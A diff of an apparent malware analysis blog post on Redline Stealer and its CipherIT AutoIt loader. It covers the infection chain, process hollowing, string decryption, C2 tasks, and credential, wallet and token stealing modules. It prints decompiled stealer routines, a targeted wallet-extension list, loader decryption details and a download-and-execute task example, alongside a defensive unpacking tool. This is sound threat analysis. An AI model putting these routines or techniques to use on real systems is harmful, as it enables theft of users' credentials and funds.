@@ -26,13 +26,13 @@ If you wish to support my work, you can buy me a coffee [here](buymeacoffee.com/
 - *Redline Stealer* has the ability to present a message box to the user upon execution.
 - *Redline Stealer* communicates with the C2 server using Simple Object Access Protocol (SOAP).
 - *Redline Stealer* exits if it detects the infected machine is from a near Russian countries.
-- *Redline Stealer* executes its modules in random order to potentially evade heuritic detection.
+- *Redline Stealer* executes its modules in random order to potentially evade heuristic detection.
 
-PLACEHOLDER (Write single paragraph summary here)
+(EXECUTIVE SUMMARY HERE)
 
 ## Infection Chain
 
-The infection chain starts with a download of `[BigTitsRoundAsses] 17.12.14 - Jazmyn [1080p].scr` (installer) from `pornleech[.]ch`, which creates three files, an AutoIt interpreter, Batch script, and autoit script. The batch script is executed with `cmd.exe` by the installer. The process of the initial infection is indicated in Figure 1.
+The infection chain starts with a download of `[BigTitsRoundAsses] 17.12.14 - Jazmyn [1080p].scr` (installer) from `pornleech[.]ch`, which creates three files, an AutoIt interpreter, Batch script, and AutoIt script. The batch script is executed with `cmd.exe` by the installer. The process of the initial infection is indicated in Figure 1.
 
 {{< mermaid >}}
   graph TD
@@ -57,7 +57,7 @@ The infection chain starts with a download of `[BigTitsRoundAsses] 17.12.14 - Ja
 
 Once extracted, the installer executes `cmd /c cmd < Quella.mp3 & ping -n 5 localhost`, which executes `tasklist` to identify if `PSUAService.exe` (PandaAV) is currently running. If the process is not running, it uses `autoit.exe` as the file name for the AutoIt interpreter. Otherwise, the AutoIt interpreter is named `Magenta.exe.pif`.
 
-Next, the magic bytes `MZ` is written to the start of the file to contain the AutoIt interpreter. Once written, the file `%TEMP%\Che.mp3` is filtered by `findstr` to exclude the string a string (Figure 2), which results in writing the rest of the AutoIt interperter to the `%TEMP%` directory as either `autoit.exe` or `Magenta.exe.pif`. Next, `%TEMP%\Travolge.mp3` is moved to the file `%TEMP%\i`, which is then executed with the AutoIt interpreter (Figure 2).
+Next, the magic bytes `MZ` is written to the start of the file to contain the AutoIt interpreter. Once written, the file `%TEMP%\Che.mp3` is filtered by `findstr` to exclude the string a string (Figure 2), which results in writing the rest of the AutoIt interpreter to the `%TEMP%` directory as either `autoit.exe` or `Magenta.exe.pif`. Next, `%TEMP%\Travolge.mp3` is moved to the file `%TEMP%\i`, which is then executed with the AutoIt interpreter (Figure 2).
 
 ```powershell
 Set AUTOIT=Mantenga.exe.pif
@@ -71,9 +71,9 @@ ping localhost -n 5
 ```
 *Figure 2: Redline Stealer Deobfuscated Batch Script*
 
-### Obfuscated AutoIT Script
+### CipherIT (AutoIT Script)
 
-Next, the AutoIT interpreter executes `i`.  Then the AutoIT script performs process hollowing, creates the process `jsc.exe` in suspended mode, hollows the process then injects the process with Redline Stealer.
+Next, the AutoIT interpreter executes `i`.  Then the AutoIT script performs process hollowing, creates the process `jsc.exe` in suspended mode, hollows the process then injects the process with *Redline Stealer*.
 
 ```python
 def decode_string(string: str, key: int) -> str:
@@ -98,23 +98,26 @@ If(Execute("EnvGet('COMPUTERNAME')") = "ELICZ") Then
 	Execute("WinClose(AutoItWinGetTitle())")
 ```
 
-Installer → Quella.mp3 (BAT) → Mantenga.exe.pif (Loader) → jsc.exe
-
 The AutoIt script decrypts the payload by performing the following:
 - Allocating executable memory
 - Writes the shellcode depending on architecture to the executable memory space
 - Executes the shellcode by calling `CallWindowProc`, using the `lpPrevWndFunc` parameter as the pointer to shellcode for the first stage of RC4 decryption, the `Msg` parameter as the pointer to the RC4 decryption key, and the `wParam` parameters as the RC4 key length.
-- Calls `CallWindowProc` again, with the `lpPrevWndFunc` pointing to the function responsible for the decryption routine for RC4, the `Msg` paramater pointing to the ciphertext, and the `wParam`, pointing to the ciphertext length.
+- Calls `CallWindowProc` again, with the `lpPrevWndFunc` pointing to the function responsible for the decryption routine for RC4, the `Msg` parameter pointing to the cipher-text, and the `wParam`, pointing to the ciphertext length.
 - The  last call to `CallWindoProc`, returns the decrypted data, which is LZNT1 compressed
 - The LZNT1 compressed data, is decompressed by calling `RtlDecompressBuffer` using `COMPRESSION_FORMAT_LZNT1`
-- The proceess  `%WINDOWS%\Microsoft.NET\Framework\v4.0.30319\jsc.exe`, created in suspended mode and Redline Stealer is injected using process hollowing
+
+Once the *CipherIT* has performed decryption using RC4 and decompression using LZNT1 to extract *Redline Stealer*, *CipherIT* calls `kernel32.CreateProcessW` to create the process `%WINDOWS%\Microsoft.NET\Framework\v4.0.30319\jsc.exe` in suspended mode.
 
 ```text
 9113177476903537125675877499912933
 ```
-*Figure placeholder. AutoIt RC4 Decryption Key*
+*Figure 1. CipherIT Shellcode RC4 Decryption Key*
 
-I wrote a tool to extract payloads from this AutoIt loader, which is provided below.
+Next, *CipherIT* copies `%WINDOWS%\System32\ntdll.dll` to `%CD%\swSOYnMH.dll`. Once completed, *CipherIT*, uses the AutoIT function `DllCall` to call future `ntdll.dll` APIs from `%CD%\swSOYnMH.dll`; likely in an attempt to avoid API hooking on `ntdll.dll` from the `%WINDOWS%\System32\` directory. This of course is significantly dependant on how various security solutions may implement their user-mode hooking techniques.
+
+Next, *CipherIT* hollows the process `jsc.exe` that was created previously, injects *Redline Stealer*, then calls `ntdll.NtResumeThread` to resume the hollowed process; which is now *Redline Stealer*.
+
+We wrote a tool to extract payloads from *CipherIT*, which is provided below.
 
 ```python
 #!/usr/bin/env python
@@ -181,11 +184,11 @@ ct = get_ciphertext(data)
 pt = lznt1(rc4(key.encode(), ct))
 open(args.output, 'wb').write(pt)
 ```
-*Figure placeholder. AutoIt Loader Static Unpacking Tool*
+*Figure 2. AutoIt Loader Static Unpacking Tool*
 
 ## Redline Stealer
 
-[Redline Stealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer) is an information stealing malware available for purchase on underground forums and sells standalone and as a subscription service. This section of the blog is a technical analysis of Redline Stealer and its capabilities.
+[Redline Stealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer) is an information stealing malware available for purchase on underground forums and sells standalone and as a subscription service. This section of the blog is a technical analysis of *Redline Stealer* and its capabilities.
 
 ### Language Check
 
@@ -193,7 +196,7 @@ Once executed, *Redline Stealer* checks the country of origin against Armenia, A
 
 ### String Decryption
 
-To decrypt strings, *Redline Stealer* calls `StrinDecrypt.Read`, which base64-decodes the ciphertext, then performs a rotating XOR operation using the key user string (`#US`) `Kenners`.
+To decrypt strings, *Redline Stealer* calls `StrinDecrypt.Read`, which base64-decodes the ciphertext, then performs a rotating XOR operation using the key user string (`#US`) `Kenners` (Figure 3).
 
 ```python
 import base64
@@ -209,11 +212,11 @@ class StringDecrypt():
 	    plaintext = bytes(plaintext).decode('utf-8')
 	    return base64.b64decode(plaintext).decode('utf-8')
 ```
-*Figure 1. Redline Stealer String Decryption Routine in Python*
+*Figure 3. Redline Stealer String Decryption Routine in Python*
 
 ### User Message
 
-If the field `Arguments.Message` is not an empty or a `null` string, it is decrypted by calling `StringDecrypt.Read` (Figure 1) and subsequently presented to the user in a message box. The execution of *Redline Stealer* is not halted during this process, as the message box is created using a new thread. This functionality in Redline Stealer allows operators to present messages to users, such as fake error messages and more.
+If the field `Arguments.Message` is not an empty or a `null` string, it is decrypted by calling `StringDecrypt.Read` (Figure 3) and subsequently presented to the user in a message box. The execution of *Redline Stealer* is not halted during this process, as the message box is created using a new thread. This functionality in *Redline Stealer* allows operators to present messages to users, such as fake error messages and more.
 
 ### C2 Communication
 
@@ -250,7 +253,7 @@ To establish a connection with the C2 server, Redline Stealer creates a new clas
 *Redline Stealer* stores results of data collected from the victim machine in a data contract, which is created with the data member `ID`. The value of this data member is `100822` originating from `Arguments.ID`, which is decrypted using `StringDecrypt.Read` and `ID` serves as the build ID.
 
 ![build_id](images/b8160dbd643f3717cd2ffc345e2a47e6ce072cc5898afb548dc50468fcafa4ff.png)
-*Figure placeholder. Redline Stealer Build ID ([reference](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-redline-stealer))*
+*Figure 4. Redline Stealer Build ID ([reference](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-redline-stealer))*
 
 ### Modules
 
@@ -287,14 +290,14 @@ The modules in the group `First` only collect data, which is later sent to the C
 
 #### GetAVs (defenders)
 
-This module performs the WMI queries provided in Figure 2, against `ROOT\\SecurityCenter` and `ROOT\\SecurityCenter2`.
+This module performs the WMI queries provided in Figure 5, against `ROOT\\SecurityCenter` and `ROOT\\SecurityCenter2`.
 
 ```text
 SELECT * FROM AntivirusProduct
 SELECT * FROM AntiSpyWareProduct
 SELECT * FROM FirewallProduct
 ```
-*Figure 2. Redline Stealer WMI Queries*
+*Figure 5. Redline Stealer WMI Queries*
 
 Once completed, the results are appended to a list, which is sent to the C2 server.
 
@@ -304,7 +307,7 @@ This module performs the WMI query `SELECT * FROM Win32_Processor`, collecting t
 
 #### ListOfPrograms (softwares)
 
-This module opens the sub registry key `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall`. Next, the sub key names are iterated for their `DisplayName` and associated `DisplayVersion`. Once these values are obtained, they are added to a list of strings in the format described in Figure 3.
+This module opens the sub registry key `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall`. Next, the sub key names are iterated for their `DisplayName` and associated `DisplayVersion`. Once these values are obtained, they are added to a list of strings in the format described in Figure 6.
 
 ```text
 DisplayName0 [DisplayVersion0]
@@ -312,7 +315,7 @@ DisplayName1 [Displayversion1]
 DisplayName3 [Displayversion3]
 ...
 ```
-Figure 3. Redline Stealer Program List Module Structure
+Figure 6. Redline Stealer Program List Module Structure
 
 Next, the results are sent to the C2 server.
 
@@ -322,12 +325,12 @@ If the infected endpoint is 32-bit Redline Stealer opens the registry key `SOFTW
 
 #### ListProcesses (processes)
 
-Redline Stealer performs the WMI query `SELECT * FROM Win32_Processes Where SessionId='<current-processes-session-id>'`. Once completed, the results are parsed for `ProcessId`, `Name`, and `CommandLine`. The structure of the data collected is provided in Figure 4.
+Redline Stealer performs the WMI query `SELECT * FROM Win32_Processes Where SessionId='<current-processes-session-id>'`. Once completed, the results are parsed for `ProcessId`, `Name`, and `CommandLine`. The structure of the data collected is provided in Figure 7.
 
 ```text
 ID: <ProcessId>, Name: <Name>, CommandLine: <CommandLine>
 ```
-*Figure 4. Redline Stealer Process List Structure*
+*Figure 7. Redline Stealer Process List Structure*
 
 #### Languages
 
@@ -339,6 +342,7 @@ public static void GetLanguages(ConnectionProvider connection, SettingsStruct se
 		result.SystemInfo.Languages = SystemInfoHelper.AvailableLanguages();
 	}
 ```
+*Figure 8. Redline Stealer Get Languages*
 
 #### GetTelegramProfiles
 
@@ -372,10 +376,11 @@ public static void StealTelegram(ConnectionProvider connection, SettingsStruct s
 		}
 	}
 ```
+*Figure 9. Redline Stealer Steal Telegram*
 
 #### StealWallets
 
-To steal cryptocurrency wallets, Redline Stealer checks if the Wallets module is enabled. If enabled, Redline Stealer initializes the first wallet module, passing the BrowserPath configuration from the C2, and initializes the crypto wallets in Figure placeholder, by splitting them by lines and into key value pairs using the delimiter `|`. 
+To steal cryptocurrency wallets, *Redline Stealer* checks if the Wallets module is enabled. If enabled, *Redline Stealer* initializes the first wallet module, passing the `BrowserPath` configuration from the C2, and initializes the crypto wallets in Figure 10, by splitting them by lines and into key value pairs using the delimiter `|`. 
 
 ```text
 ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet
@@ -445,16 +450,17 @@ dngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet
 bhghoamapcdpbohphigoooaddinpkbai|Authenticator
 ookjlbkiijinhpmnjffcofjonbfbgaoc|TempleWallet
 ```
-*Figure placeholder. Redline Stealer Wallets*
+*Figure 10. Redline Stealer Wallets*
 
-The key is the path expected to match the wallet, and the value is the wallet name. Next, *Redline Stealer* iterates over the browser paths searching for Login Data, Web Data and Cookies. For each of the file paths matching these strings, Redline Stealer collects the valid paths for the crypto currency wallets (Figure placeholder).
+The key is the path expected to match the wallet, and the value is the wallet name. Next, *Redline Stealer* iterates over the browser paths searching for Login Data, Web Data and Cookies. For each of the file paths matching these strings, Redline Stealer collects the valid paths for the crypto currency wallets (Figure 11).
 
 ```text
 <browser-name>_<user-data-path>_<crypto_wallet>
 "%Path%/Local Extension Settings/afbcbjpbpfadlkmhmclhkeeodmamcflc"
 ```
+*Figure 11. Redline Stealer Crypto Wallet Paths*
 
-Next, *Redline Stealer* searches for the files wallet.dat and wallet. These results are returned in a list of scanner results.
+Next, *Redline Stealer* searches for the files `wallet.dat` and wallet. These results are returned in a list of scanner results.
 
 Once completed, *Redline Stealer* collects the files identified and sends them to the C2 server.
 
@@ -475,6 +481,7 @@ public static void StealWallets(ConnectionProvider connection, SettingsStruct se
 		}
 	}
 ```
+*Figure 12. Redline Stealer Stealing Wallets*
 
 #### StealDiscord
 
@@ -491,6 +498,7 @@ public static void StealDiscord(ConnectionProvider connection, SettingsStruct se
 		}
 	}
 ```
+*Figure 13. Redline Stealer Stealing Discord Tokens.*
 
 #### StealSteam
 
@@ -508,24 +516,11 @@ public static void StealSteam(ConnectionProvider connection, SettingsStruct sett
 		}
 	}
 ```
+*Figure 14. Redline Stealer Stealing Steam Sessions*
 
 #### StealVPN
 
 To steal Nord VPN credentials, *Redline Stealer* searches the directory `%USERPROFILE%\AppData\Local\NordVPN` with the search pattern `NordVPN.exe*`. If *Redline Stealer* is able to identify a file named user.config, *Redline Stealer* extracts the username and password. 
-
-```csharp
-	public static void StealSteam(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
-	{
-		if (settings.StealSteam)
-		{
-			result.SystemInfo.StealSteam = FileScanning.Search(new Extractor[]
-			{
-				new Steam()
-			});
-		}
-	}
-
-```
 
 To steal OpenVPN credentials, *Redline Stealer* collects files the directory `%USERPROFILE%\\AppData\\Roaming\\OpenVPN Connect\\profiles` using the search pattern `*ovpn`.
 
@@ -548,6 +543,7 @@ public static void StealVPN(ConnectionProvider connection, SettingsStruct settin
 		}
 	}
 ```
+*Figure 15. Redline Stealer Stealing VPN Credentials*
 
 #### StealBrowsers
 
@@ -565,10 +561,11 @@ public static void BrowserStealer(ConnectionProvider connection, SettingsStruct 
 		}
 	}
 ```
+*Figure 16. Redline Stealer Stealing Browser Data*
 
 #### Remote Tasks
 
-To execute remote tasks, *Redline Stealer* makes a request to the C2 server. Next, Redline Stealer is able to perform four types of remote tasks. These remote tasks include arbitrary command execution, downloading of files, downloading and execution of files and executing files (Table placeholder).
+To execute remote tasks, *Redline Stealer* makes a request to the C2 server. Next, Redline Stealer is able to perform four types of remote tasks. These remote tasks include arbitrary command execution, downloading of files, downloading and execution of files and executing files (Table 4).
 
 | Task                        | Example                                                 | Description                             |
 | --------------------------- | ------------------------------------------------------- | --------------------------------------- |
@@ -577,7 +574,7 @@ To execute remote tasks, *Redline Stealer* makes a request to the C2 server. Nex
 | Download and Execute        | `http://example.com/example.exe\|%AppData%\\example.exe` | Download and Execute a File             |
 | Execute a File              | `C:\Users\example\example.exe`                          | Execute a File                          | 
 
-*Table placeholder. Redline Stealer Remote Tasks*
+*Table 4. Redline Stealer Remote Tasks*
 
 ### Configuration Extraction
 
@@ -605,7 +602,7 @@ mwcfg -m modules/ -i tests/redline/676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c
   }
 ]
 ```
-*Figure placeholder. Redline Stealer Configuration Extraction*
+*Figure 17. Redline Stealer Configuration Extraction*
 
 ## Conclusion
 
